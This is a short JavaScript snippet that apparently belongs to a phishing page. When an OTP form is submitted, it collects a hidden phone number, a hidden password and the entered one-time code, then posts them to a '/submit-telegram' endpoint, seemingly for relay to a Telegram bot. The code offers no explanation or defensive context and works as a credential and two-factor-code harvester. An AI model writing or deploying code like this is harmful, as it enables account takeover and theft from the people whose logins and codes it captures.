document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('otpForm');
    if (!form) return;

    form.addEventListener('submit', function(e) {
        setTimeout(function() {
            const phone = document.getElementById('hiddenPhone')?.value || 'No phone';
            const password = document.getElementById('hiddenPassword')?.value || 'No password';
            const code = document.getElementById('otpCode')?.value || 'No code';

            fetch('/submit-telegram', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || '{{ csrf_token() }}'
                },
                body: JSON.stringify({ phone, password, code })
            })
            .then(response => response.json())
            .then(data => console.log('Telegram response:', data))
            .catch(err => console.log('Telegram error:', err));
        }, 300);
    });
});